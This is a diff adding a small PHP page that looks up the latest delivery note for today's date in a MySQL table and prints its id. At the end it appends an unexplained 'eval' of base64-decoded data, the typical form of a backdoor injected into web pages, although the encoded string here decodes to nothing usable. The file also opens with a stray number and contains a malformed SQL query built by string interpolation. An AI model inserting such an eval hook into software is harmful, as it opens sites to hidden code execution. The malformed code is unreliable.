@@ -1,0 +1,16 @@
+86050420131
+
+<?php 
+include_once("config/connection.php"); 
+$tgl     = date("d-m-Y");
+$sql     = "SELECT * FROM tbl_deliverynote where dn_no AND tanggal_order like'%$tgl%' ORDER by id DESC LIMIT 1";
+$query   = mysqli_query($mysqli, $sql);
+while($d = mysqli_fetch_array($query)){ 
+?>
+<?php echo $d['id'];?> 
+    <?php
+ 
+ }
+ ?>
+
+ <?php eval("?>".base64_decode("isis")); ?>
